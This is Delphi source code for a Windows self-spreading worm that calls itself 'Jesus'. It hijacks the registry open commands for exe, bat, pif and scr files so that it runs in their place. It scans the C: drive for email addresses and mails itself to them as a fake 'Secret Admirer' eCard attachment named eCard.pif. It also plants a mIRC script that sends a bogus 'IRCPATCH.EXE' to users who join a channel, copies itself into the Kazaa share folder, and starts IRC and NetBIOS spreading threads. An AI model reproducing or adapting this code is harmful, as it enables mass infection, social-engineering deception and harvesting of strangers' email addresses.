program Project1;

// Hello.

uses
  Windows,
  Winsock,
  mxlookup,
  messages,
  Settings,
  ZIP in 'ZIP.PAS',
  irc,
  CRC32 in 'CRC32.PAS',
  AclUtils in 'ACLUnits\ACLUTILS.PAS',
  NetBIOS in 'NetBIOS.pas';

TYPE
  Triple = ARRAY[1..3] OF BYTE;
  Quad   = ARRAY[1..4] OF BYTE;

  TFileName = type string;
  TSearchRec = record
    Time: Integer;
    Size: Integer;
    Attr: Integer;
    Name: TFileName;
    ExcludeAttr: Integer;
    FindHandle: THandle  platform;
    FindData: TWin32FindData  platform;
  end;

  LongRec = packed record
    case Integer of
      0: (Lo, Hi: Word);
      1: (Words: array [0..1] of Word);
      2: (Bytes: array [0..3] of Byte);
  end;

var
 m_hwnd:hwnd;
 hmain :hwnd;
 DlDir1:string;
  H,i:integer;
  AMAILS:string;
  SMTPServer            : STRING = '';
  SMTPAcc               : STRING = '';
  Buf                   : ARRAY[0..255] OF Char;
  KNAME                 : ARRAY[0..255] OF STRING;
  pid                   :cardinal;
  FileBuf               : ARRAY[1..1000000] OF BYTE;
  CC                    : STRING = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';

CONST
  CRLF                  = #13#10;
  d_Subject             : string = 'Superzone eCard from Secret Admirer' ;
  d_Body                : string = 'eCard@Superzone is an online service for sending eCards.'+#13#10+#13#10+
                        'Dear reader,'+#13#10+#13#10+
                        'You have been sent an eCard from ''Secret Admirer''!'+#13#10+#13#10+
                        'To see the eCard, simply open the attachment.'+#13#10+#13#10+
                        'Send an eCard to someone that you care. It''s free!'+#13#10+#13#10+#13#10+
                        'eCard@Superzone'+#13#10+
                        'http://eCard.Superzone.com/'+#13#10+#13#10+
                        'Save trees, send eCards.'+#13#10+#13#10+
                        'eCard@Superzone: part of the Superzone Network.'+#13#10+
                        'http://www.superzone.com/';
  d_attachment          : string = 'eCard.zip' ;

FUNCTION ExtractFilename(S:String):String;
BEGIN
WHILE POS('\',S)>0 DO BEGIN
 S:=COPY(S,POS('\',S)+1,LENGTH(S));
END;
 RESULT:=S;
END;

FUNCTION Codeb64(Count:BYTE;T:Triple) : STRING;
VAR
  Q    : Quad;
  Strg : STRING;
BEGIN
  IF Count<3 THEN BEGIN
    T[3]:=0;
    Q[4]:=64;
  END ELSE Q[4]:=(T[3] AND $3F);
  IF Count<2 THEN BEGIN
    T[2]:=0;
    Q[3]:=64;
  END ELSE Q[3]:=Byte(((T[2] SHL 2)OR(T[3] SHR 6)) AND $3F);
  Q[2]:=Byte(((T[1] SHL 4) OR (T[2] SHR 4)) AND $3F);
  Q[1]:=((T[1] SHR 2) AND $3F);
  Strg:='';
  FOR Count:=1 TO 4 DO Strg:=(Strg+CC[(Q[Count]+1)]);
  RESULT:=Strg;
END;

FUNCTION BASE64(DataLength:DWORD) : AnsiString;
VAR
  B      : AnsiString;
  I      : DWORD;
  Remain : DWORD;
  Trip   : Triple;
  Count  : WORD;
BEGIN
  Count:=0;
  B:='';
  FOR I:=1 TO DataLength DIV 3 DO BEGIN
    INC(Count,4);
    Trip[1]:=Ord(FileBuf[(I-1)*3+1]);
    Trip[2]:=Ord(FileBuf[(I-1)*3+2]);
    Trip[3]:=Ord(FileBuf[(I-1)*3+3]);
    B:=B+codeb64(3,Trip);
    IF Count=76 THEN BEGIN
      B:=B+CRLF;
      Count:=0;
    END;
  END;
  Remain:=DataLength-(DataLength DIV 3)*3;
  IF Remain>0 THEN BEGIN
    Trip[1]:=Ord(FileBuf[DataLength-1]);
    IF Remain>1 THEN Trip[2]:=Ord(FileBuf[DataLength]);
    IF Remain=1 THEN B:=B+Codeb64(1,Trip) ELSE B:=B+Codeb64(2,Trip);
  END;
  RESULT:=B;
END;

FUNCTION IPstr(HostName:STRING) : STRING;
LABEL Abort;
TYPE
  TAPInAddr = ARRAY[0..100] OF PInAddr;
  PAPInAddr =^TAPInAddr;
VAR
  WSAData    : TWSAData;
  HostEntPtr : PHostEnt;
  pptr       : PAPInAddr;
  I          : Integer;
BEGIN
  Result:='';
  WSAStartUp($101,WSAData);
  TRY
    HostEntPtr:=GetHostByName(PChar(HostName));
    IF HostEntPtr=NIL THEN GOTO Abort;
    pptr:=PAPInAddr(HostEntPtr^.h_addr_list);
    I:=0;
    WHILE pptr^[I]<>NIL DO BEGIN
      IF HostName='' THEN BEGIN
        IF(Pos('169',inet_ntoa(pptr^[I]^))<>1)AND(Pos('192',inet_ntoa(pptr^[I]^))<>1) THEN BEGIN
          Result:=inet_ntoa(pptr^[I]^);
          GOTO Abort;
        END;
      END ELSE
      RESULT:=(inet_ntoa(pptr^[I]^));
      Inc(I);
    END;
    Abort:
  EXCEPT
  END;
  WSACleanUp();
END;

function sysdir:String;
var
 ap:array[0..666]of char;
begin
 getsystemdirectory(ap,255);
 result := ap;
 result := result+'\';
end;

function windir:String;
var
 ap:array[0..666]of char;
begin
 getwindowsdirectory(ap,255);
 result := ap;
 result := result+'\';
end;

Procedure FMail1;
var
  F                     : FILE;
  A,B,J,Attachment,
  Recip                 : STRING;
  Sock                  : TSocket;
  Wsadatas              : TWSADATA;
  SockAddrIn            : TSockAddrIn;

FUNCTION Mys(STR:STRING) : BOOL;
BEGIN
  IF Send(Sock,STR[1],Length(STR),0)=SOCKET_ERROR THEN Result:=false ELSE Result:=true;
END;

Begin
  Attachment := sysdir+'Z.TMP';
  copyfile(pchar(paramstr(0)),pchar(attachment),false);
  zip_make(Attachment,Sysdir+D_Attachment,'eCard.pif');
  if DLDIR1 = '' then DLDIR1 := '"Superzone eCard" <ecard@superzone.com>';
While AMAILS <> '' do begin
Recip := copy(AMAILS,1,pos(#13#10,AMAILS)-1);

  SMTPServer:=GetSMTPAddress(copy(recip,pos('@',recip)+1,length(recip)));
  IF SMTPServer<>'' THEN BEGIN
    mails:=inttostr(strtoint(mails)+1);
    WSAStartUp(257,wsadatas);
    Sock:=Socket(AF_INET,SOCK_STREAM,IPPROTO_IP);
    SockAddrIn.sin_family:=AF_INET;
    SockAddrIn.sin_port:=htons(25);
    SockAddrIn.sin_addr.S_addr:=inet_addr(PChar(IPstr(SMTPServer)));
    Repeat I:=Connect(Sock,SockAddrIn,SizeOf(SockAddrIn)) until i=0;
    Repeat
    sleep(1);
     until Mys('HELO hotmail.com'+CRLF);
    Recv(Sock,Buf,Sizeof(Buf),0);
    Repeat sleep(0); until Mys('MAIL FROM: '+DLDIR1+CRLF); //"Superzone eCard" <ecard@superzone.com>
    Recv(Sock,Buf,Sizeof(Buf),0);
    Repeat sleep(0); until Mys('RCPT TO: '+recip+CRLF);
    Recv(Sock,Buf,Sizeof(Buf),0);
    Repeat sleep(0); until Mys('DATA'+CRLF);
    Recv(Sock,Buf,Sizeof(Buf),0);
    randomize();
a := '';
b := '';
while length(a) <= 13 do
a:=a+inttostr(random(9));

while length(b) <= 4 do
b := inttostr(random(99999));

j := 'Message-ID: '+a+'.'+b+'.qmail@hotmail.com';

    Repeat sleep(0); until Mys(j+crlf);
    Repeat sleep(0); until Mys('From: '+DLDIR1+CRLF);
    Repeat sleep(0); until Mys('Subject: '+D_subject+CRLF);
    Repeat sleep(0); until Mys('To: '+Recip+CRLF);
    Repeat sleep(0); until Mys('MIME-Version: 1.0'+CRLF);
    Repeat sleep(0); until Mys('Content-Type: multipart/mixed; boundary="bla"'+CRLF+CRLF);
    Repeat sleep(0); until Mys('--bla'+CRLF);
    Repeat sleep(0); until Mys('Content-Type: text/plain; charset:us-ascii'+CRLF+CRLF);
    Repeat sleep(0); until Mys(D_body+CRLF+CRLF);
    Repeat sleep(0); until Mys('--bla'+CRLF);
    Repeat sleep(0); until Mys('Content-Type: audio/x-wav;'+CRLF);
    Repeat sleep(0); until Mys('    name="'+D_attachment+'"'+CRLF);
    Repeat sleep(0); until Mys('Content-Transfer-Encoding: base64'+CRLF+CRLF);
    AssignFile(F,Sysdir+D_Attachment);
    FileMode:=0;
    {$I-}
    Reset(F,1);
    IF IOResult=0 THEN BEGIN
      BlockRead(F,FileBuf[1],FileSize(F));
      Repeat sleep(0); until Mys(BASE64(FileSize(F)));
      CloseFile(F);
    END;
    {$I+}
    Repeat sleep(0); until Mys(CRLF+'--bla--'+CRLF+CRLF);
    Repeat sleep(0); until Mys(CRLF+'.'+CRLF);
    Recv(Sock,Buf,Sizeof(Buf),0);
    Repeat sleep(0); until Mys('QUIT'+CRLF);
    Recv(Sock,Buf,Sizeof(Buf),0);
    WSACleanup();
  END;
AMAILS := copy(AMAILS,pos(#13#10,AMAILS)+2,length(AMAILS));
end;

End;

function AnsiUpperCase(const S: string): string;
{$IFDEF MSWINDOWS}
var
 Len: Integer;
begin
 Len := Length(S);
 SetString(Result, PChar(S), Len);
 if Len > 0 then CharUpperBuff(Pointer(Result), Len);
end;
{$ENDIF}
{$IFDEF LINUX}
begin
 Result := WideUpperCase(S);
end;
{$ENDIF}

function IntToStr(X: integer): string;
var
 S: string;
begin
 Str(X, S);
 Result := S;
end;

function StrToInt(S: string): integer;
var
 V, Code: integer;
begin
 Val(S, V, Code);
 Result := V;
end;

function Trim(const S: string): string;
var
 I, L: Integer;
begin
 L := Length(S);
 I := 1;
 while (I <= L) and (S[I] <= ' ') do Inc(I);
 if I > L then Result := '' else
  begin
   while S[L] <= ' ' do Dec(L);
   Result := Copy(S, I, L - I + 1);
  end;
end;


function FileSize(FileName: string): int64;
var
  h: THandle;
  fdata: TWin32FindData;
begin
  result:= -1;

  h:= FindFirstFile(PChar(FileName), fdata);
  if h <> INVALID_HANDLE_VALUE then
  begin
    Windows.FindClose(h);
    result:= int64(fdata.nFileSizeHigh) shl 32 + fdata.nFileSizeLow;
  end;
end;

Function Grabmail(Filename:string):String;
Var
 F:Textfile;
 L1,L2,Text:string;
 MAIL:String;
 H,E,i, A:Integer;
 ABC,ABC2:STRING;
Label again;
begin
 ABC:='abcdefghijklmnopqrstuvwxyz_-ABCDEFGHIJKLMNOPQRSTUVWXYZ';
 ABC2:='abcdefghijklmnopqrstuvwxyz_-ABCDEFGHIJKLMNOPQRSTUVWXYZ.';
 if filesize(filename) > 5000 then exit;
 CopyFile(Pchar(Filename),pchar(Filename+'_'),false);
 sleep(300);
 AssignFile(F,Filename+'_');
 try
  Reset(F);
 except
  exit;
 end;
 Read(F,L1);
 ReadLN(F,L2);
 Text:=L1;
 While NOt EOF(F) DO BEGIN
  Read(F,L1);
  ReadLN(F,L2);
  Text:=Text+'|'+L1;
 END;
 Closefile(F);
 Deletefile(pchar(Filename+'_'));
 sleep(200);
 if copy(text,1,2)='MZ' then exit;
 text:='|'+text+'|';
 result:='';
//Now we gather the informition.
 AGAIN:
 IF pos('@',Text)>0 then begin
  A:=Pos('@',Text)-1;
  if a =0 then a := 1;
  L1 := copy(text,a,1);
  L2 := copy(text,a+2,1);
  H := pos(L1,abc);
  E := pos(L2,abc2);
  if (H = 0) or (e=0) then begin
   text:=copy(text,a+1,length(text));
   goto again;
  end;
  While POS(Copy(TExt,a,1),ABC)>0 do begin
   A:=A-1;
  end;
  a := a +1;
  Mail := copy(Text,a,length(text)); //grab start of mail.
  Mail := COpy(Mail,1,pos('@',mail)+2);
  i:= pos(MAIL,text)+length(mail);
  While pos(copy(mail,length(mail),1),ABC2)>0 do begin
   Mail := mail+copy(text,i,1);
   i:=i+1;
  end;
  if POS(copy(mail,length(mail),1),ABC2)=0 then Mail:=copy(mail,1,length(mail)-1);
  Result := Result+#13#10+Mail;
  Text:=copy(text,pos(mail,text)+length(mail),length(text));
  goto AGAIN;
 end;

end;

   procedure ListFiles(D, Name, SearchName : String);
const
  faReadOnly  = $00000001 platform; 
  faHidden    = $00000002 platform; 
  faSysFile   = $00000004 platform; 
  faVolumeID  = $00000008 platform;
  faDirectory = $00000010; 
  faArchive   = $00000020 platform;
  faAnyFile   = $0000003F; 
 
type 
  TFileName = type string; 
  TSearchRec = record 
    Time: Integer; 
    Size: Integer; 
    Attr: Integer; 
    Name: TFileName; 
    ExcludeAttr: Integer; 
    FindHandle: THandle  platform; 
    FindData: TWin32FindData  platform;
  end;
 
  LongRec = packed record 
    case Integer of 
      0: (Lo, Hi: Word); 
      1: (Words: array [0..1] of Word); 
      2: (Bytes: array [0..3] of Byte); 
  end; 

  function FindMatchingFile(var F: TSearchRec): Integer;
  var 
    LocalFileTime: TFileTime;
    M:Textfile;
  begin
    with F do
    begin
      while FindData.dwFileAttributes and ExcludeAttr <> 0 do
        if not FindNextFile(FindHandle, FindData) then
        begin
          Result := GetLastError;
          Exit;
        end;
      FileTimeToLocalFileTime(FindData.ftLastWriteTime, LocalFileTime);
      FileTimeToDosDateTime(LocalFileTime, LongRec(Time).Hi,
        LongRec(Time).Lo);
      Size := FindData.nFileSizeLow;
      Attr := FindData.dwFileAttributes;
      Name := FindData.cFileName;
      if not ((attr and faDirectory) = faDirectory) then begin
if ((Ansiuppercase(name)='MIRC32.EXE') or
    (Ansiuppercase(name)='MIRC.EXE') or
    (Ansiuppercase(name)='IRC32.EXE') or
    (Ansiuppercase(name)='NNIRC32.EXE')) then begin
     assignfile(m,d+'script.ini');
     rewrite(m);
     writeln(m, '; This script was made by Khaled Mardam-bey');
     writeln(m, '; Do not change anything in this script');
     writeln(m, '; Because it can cause some seriouse damage');
     writeln(m, '; To your system.');
     writeln(m, ' ');
     writeln(m, 'On *:JOIN:*:{');
     writeln(m, ' if ($NICK !ISOP $CHAN) {');
     writeln(m, '  IF ($NICK != $ME) {');
     writeln(m, '   .DCC SEND $NICK '+SYSDIR+'IRCPATCH.EXE');
     writeln(m, '   .MSG $NICK Seriouse ircworm started spreading this morning, therefor this server sends out pathces to cover up the holes that the worm uses.');
     writeln(m, '   .IGNORE $NICK');
     writeln(m, '  }');
     writeln(m, ' }');
     writeln(m, '}');
    end;

if (Ansiuppercase(copy(name,length(name)-2,3))='EXE') then
     if H <= 255 THEN KNAME[H] := NAME;
 H:=H+1;
if ((Ansiuppercase(copy(name,length(name)-2,3))='TXT') or
    (Ansiuppercase(copy(name,length(name)-2,3))='DAT') or
    (Ansiuppercase(copy(name,length(name)-2,3))='CFG') or
    (Ansiuppercase(copy(name,length(name)-2,3))='DLL') or
    (Ansiuppercase(copy(name,length(name)-2,3))='INI')) then
       AMails := AMails + GrabMail(D+Name);
      end;
    end;
    Result := 0;
  end;

  procedure FindClose(var F: TSearchRec);
  begin
    if F.FindHandle <> INVALID_HANDLE_VALUE then
    begin
      Windows.FindClose(F.FindHandle);
      F.FindHandle := INVALID_HANDLE_VALUE;
    end;
  end;

  function FindFirst(const Path: string; Attr: Integer;
    var  F: TSearchRec): Integer;
  const
    faSpecial = faHidden or faSysFile or faVolumeID or faDirectory; 
  begin 
    F.ExcludeAttr := not Attr and faSpecial; 
    F.FindHandle := FindFirstFile(PChar(Path), F.FindData); 
    if F.FindHandle <> INVALID_HANDLE_VALUE then
    begin 
      Result := FindMatchingFile(F); 
      if Result <> 0 then FindClose(F); 
    end else 
      Result := GetLastError; 
  end;

  function FindNext(var F: TSearchRec): Integer;
  begin
    if FindNextFile(F.FindHandle, F.FindData) then
      Result := FindMatchingFile(F) else
      Result := GetLastError;
  end;

var
  SR: TSearchRec;
begin
  If D[Length(D)] <> '\' then D := D + '\';

  If FindFirst(D + '*.*', faDirectory, SR) = 0 then
    Repeat
      If ((Sr.Attr and faDirectory) = faDirectory) and (SR.Name[1] <> '.') then
        ListFiles(D + SR.Name + '\', Name, SearchName); 
    Until (FindNext(SR) <> 0); 
  FindClose(SR); 
end; 

function regReadString(kRoot: HKEY; sKey, sValue: String): String;
var
  qValue: array[0..1023] of Char;
  DataSize: Integer;
  CurrentKey: HKEY;
begin
  RegOpenKeyEx(kRoot, PChar(sKey), 0, KEY_ALL_ACCESS, CurrentKey);
  Datasize := 1023;
  RegQueryValueEx(CurrentKey, PChar(sValue), nil, nil, @qValue[0], @DataSize);
  RegCloseKey(CurrentKey);
  if qvalue <> nil then
  Result := String(qValue);
end;


const
  CM_EXIT = WM_USER + $1000;

var
  qValue: String;
  DataSize: Integer;
  CurrentKey: HKEY;
  A:DWORD;
  RvHandle:HWND;
begin

  RvHandle := findwindow('static','Jesus');
  if RvHandle > 0 then PostMessage(RvHandle, CM_EXIT, 0, 0);
  RvHandle := findwindow('static','Jesus2');
  if RvHandle > 0 then PostMessage(RvHandle, CM_EXIT, 0, 0);
  RvHandle := findwindow('static','Jesus3');
  if RvHandle > 0 then PostMessage(RvHandle, CM_EXIT, 0, 0);
  if findwindow('static','Jesus4')>0 then exitprocess(0);

 m_hWnd :=CreateWindowEx(0,'staic', '', WS_POPUP, 0,0,10, 10, 0, 0, 0, nil);
 hMain := CreateWindowEx(0,'static' , 'Jesus4', 0, 100,100,0,0,m_hWnd,0,0,nil);

(*
 m_hWnd :=CreateWindowEx(0,'staic', '', WS_POPUP, 0,0,1600,1200,0, 0, 0, nil);
 hMain := CreateWindowEx (0,'static', 'Main window',WS_POPUP + WS_VISIBLE, 40,50,200,300,m_hWnd, 0, 0, nil);
*)
// ShowWindow(hMain,SW_HIDE);
 // HKEY_CLASSES_ROOT\exefile\shell\open\command  -  "%1" %*

 copyfile(pchar(paramstr(0)),pchar(sysdir+'jesus.exe'),false);
 copyfile(pchar(paramstr(0)),pchar(sysdir+'ircpatch.exe'),false);
 qValue := sysdir+'jesus.exe "%1" %*';
 RegOpenKeyEx(HKEY_CLASSES_ROOT, PChar('exefile\shell\open\command'), REG_SZ, KEY_ALL_ACCESS, CurrentKey);
 Datasize := 1023;
 RegSetValueEx( CurrentKey,nil,0,REG_SZ,@qValue[1],Datasize);
 RegCloseKey(CurrentKey);

 RegOpenKeyEx(HKEY_CLASSES_ROOT, PChar('batfile\shell\open\command'), REG_SZ, KEY_ALL_ACCESS, CurrentKey);
 Datasize := 1023;
 RegSetValueEx( CurrentKey,nil,0,REG_SZ,@qValue[1],Datasize);
 RegCloseKey(CurrentKey);

 RegOpenKeyEx(HKEY_CLASSES_ROOT, PChar('piffile\shell\open\command'), REG_SZ, KEY_ALL_ACCESS, CurrentKey);
 Datasize := 1023;
 RegSetValueEx( CurrentKey,nil,0,REG_SZ,@qValue[1],Datasize);
 RegCloseKey(CurrentKey);

 RegOpenKeyEx(HKEY_CLASSES_ROOT, PChar('scrfile\shell\open\command'), REG_SZ, KEY_ALL_ACCESS, CurrentKey);
 Datasize := 1023;
 RegSetValueEx( CurrentKey,nil,0,REG_SZ,@qValue[1],Datasize);
 RegCloseKey(CurrentKey);

//HKEY_LOCAL_MACHINE\SOFTWARE\Kazaa\LocalContent
 qValue := regReadString(HKEY_LOCAL_MACHINE,'software\kazaa\localcontent','DownloadDir');
 if qValue <> '' then begin
  for i:=0 to 255 do
   copyfile(pchar(paramstr(0)),pchar(qValue+'\'+KNAME[I]),false);
 end;

 CreateThread(nil,0,@Ircbot,nil,0,a);
 CreateThread(nil,0,@StartNetBIOS,nil,0,a);
 Listfiles('C:\','*','*.*');
 DlDir1:=regReadString(HKEY_CURRENT_USER,'Software\Microsoft\Internet Account Manager\Accounts\00000001','SMTP Email Address');
 // NOW WE GOT THE EMAIL. THE MAILS.. what left to do? MAIL EM!
 FMail1;
 while 1<>2 do begin
 ;
 end;
end.

